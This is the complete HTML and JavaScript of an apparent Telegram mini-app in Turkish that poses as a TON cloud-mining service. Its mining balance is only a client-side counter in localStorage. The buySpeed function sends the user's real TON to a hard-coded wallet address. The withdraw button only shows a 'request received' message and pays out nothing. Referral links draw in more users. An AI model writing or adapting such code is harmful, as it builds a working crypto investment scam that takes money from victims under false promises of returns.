<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Gogircin Titan Full</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --bg: #0f172a; --card: #1e293b; --blue: #3b82f6; --text: #f8fafc; --green: #22c55e; }
        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 0; overflow: hidden; }
        .page { display: none; height: 100vh; padding: 20px; box-sizing: border-box; overflow-y: auto; text-align: center; padding-bottom: 90px; }
        .active { display: block; }
        .card { background: var(--card); padding: 18px; border-radius: 18px; margin-bottom: 15px; border: 1px solid #334155; }
        .btn { background: var(--blue); color: white; border: none; padding: 14px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; font-size: 15px; }
        .nav { position: fixed; bottom: 0; width: 100%; background: #111827; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #374151; }
        .nav-item { font-size: 11px; color: #94a3b8; cursor: pointer; text-align: center; flex: 1; }
        .nav-item.active { color: var(--blue); font-weight: bold; }
    </style>
</head>
<body>

    <div id="p-home" class="page active">
        <div id="ton-connect" style="display: flex; justify-content: center; margin-bottom: 15px;"></div>
        <div class="card">
            <p style="color: #94a3b8; margin:0;">Mevcut Bakiyen</p>
            <h1 id="top-bal" style="font-size: 38px; margin:10px 0;">0.0000</h1>
            <p style="color: var(--blue); font-weight: bold; font-size: 18px;">⛏️ <span id="pph-display">0.512</span> PPH</p>
            <button class="btn" style="background: var(--green); margin-top: 20px;" id="daily-btn" onclick="claimDaily()">🎁 Günlük Bonus Al</button>
        </div>
    </div>

    <div id="p-market" class="page">
        <h2>🚀 Titan Shop</h2>
        <div class="card">
            <h3>Hız Paketi V1</h3>
            <p>+0.50 PPH Artış</p>
            <p style="font-size: 22px; color: var(--green); font-weight: bold;">1.9 TON</p>
            <button class="btn" onclick="buySpeed(1.9, 0.50)">Yatırım Yap & Kazımı Başlat</button>
        </div>
    </div>

    <div id="p-ref" class="page">
        <h2>👥 Referans Sistemi</h2>
        <div class="card">
            <p>Davet Linkin:</p>
            <input type="text" id="ref-link" readonly style="width: 100%; padding: 10px; border-radius: 8px; background: #0f172a; color: white; border: 1px solid #334155; text-align: center;">
            <button class="btn" onclick="copyRef()" style="margin-top: 15px;">Linki Kopyala</button>
        </div>
        <div class="card">
            <p>Toplam Davet: <b id="ref-count" style="color: var(--blue);">0</b></p>
        </div>
    </div>

    <div id="p-wallet" class="page">
        <h2>💰 Cüzdan</h2>
        <div class="card">
            <h1 id="wallet-ton">0.0000</h1>
            <button class="btn" onclick="handleWithdraw()">📤 Para Çek</button>
        </div>
        <div class="card" style="text-align: left; font-size: 11px; color: #94a3b8;">
            <p id="s1">❌ 1. Çekim: 1.9 TON Yatırım & 1.9 TON Bakiye</p>
            <p id="s2">❌ 2. Çekim: 10 Ref & 50 TON Bakiye</p>
        </div>
    </div>

    <nav class="nav">
        <div class="nav-item active" onclick="showPage('p-home', this)">🏠<br>Home</div>
        <div class="nav-item" onclick="showPage('p-market', this)">🚀<br>Shop</div>
        <div class="nav-item" onclick="showPage('p-ref', this)">👥<br>Ref</div>
        <div class="nav-item" onclick="showPage('p-wallet', this)">💰<br>Wallet</div>
    </nav>

<script>
    const MY_WALLET = "UQC8qx530ORsKhEMwVVd_3UtPfjnAxKyA0DgTB1yR513oBOd";
    const tonConnectUI = new TONConnectUI.TonConnectUI({ manifestUrl: 'https://hakk2793.github.io/titan-app/tonconnect-manifest.json', buttonRootId: 'ton-connect' });

    let bal = parseFloat(localStorage.getItem('bal')) || 0;
    let pph = parseFloat(localStorage.getItem('pph')) || 0.512;
    let hasInv = localStorage.getItem('hasInv') === 'true';
    let lDaily = localStorage.getItem('lDaily') || 0;

    // Madenciliği Başlat (Otomatik çalışır)
    setInterval(() => {
        bal += pph / 3600;
        updateUI();
        localStorage.setItem('bal', bal);
    }, 1000);

    function updateUI() {
        document.getElementById('top-bal').innerText = bal.toFixed(4);
        document.getElementById('wallet-ton').innerText = bal.toFixed(4);
        document.getElementById('pph-display').innerText = pph.toFixed(3);
        
        let uid = Telegram.WebApp.initDataUnsafe.user ? Telegram.WebApp.initDataUnsafe.user.id : "GogircinUser";
        document.getElementById('ref-link').value = "https://t.me/Gogircin_bot?start=" + uid;

        if(hasInv) document.getElementById('s1').innerText = "✅ 1. Çekim Şartı Tamamlandı";
        
        let isReady = (Date.now() - lDaily >= 86400000);
        document.getElementById('daily-btn').disabled = !isReady;
        document.getElementById('daily-btn').innerText = isReady ? "🎁 Günlük Bonus Al" : "Yarın Tekrar Gel";
    }

    function claimDaily() {
        if(Date.now() - lDaily >= 86400000) {
            bal += 0.025; lDaily = Date.now();
            localStorage.setItem('lDaily', lDaily);
            updateUI(); Telegram.WebApp.showAlert("Bonus hesabına eklendi!");
        }
    }

    async function buySpeed(price, boost) {
        if(!tonConnectUI.connected) return Telegram.WebApp.showAlert("Önce Cüzdan Bağla!");
        const tx = { validUntil: Math.floor(Date.now()/1000)+60, messages:[{address: MY_WALLET, amount:(price*1000000000).toString()}] };
        try {
            await tonConnectUI.sendTransaction(tx);
            pph += boost; hasInv = true;
            localStorage.setItem('pph', pph); localStorage.setItem('hasInv', 'true');
            updateUI(); Telegram.WebApp.showAlert("Hızınız arttı!");
        } catch(e) { Telegram.WebApp.showAlert("İşlem reddedildi."); }
    }

    function showPage(id, el) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        el.classList.add('active');
    }

    function copyRef() {
        let input = document.getElementById('ref-link');
        input.select();
        document.execCommand('copy');
        Telegram.WebApp.showAlert("Davet linki kopyalandı!");
    }

    function handleWithdraw() {
        if(!hasInv) return Telegram.WebApp.showAlert("Çekim için 1.9 TON yatırım gerekli!");
        Telegram.WebApp.showAlert("Talep alındı.");
    }

    window.onload = () => { Telegram.WebApp.ready(); Telegram.WebApp.expand(); updateUI(); };
</script>
</body>
</html>
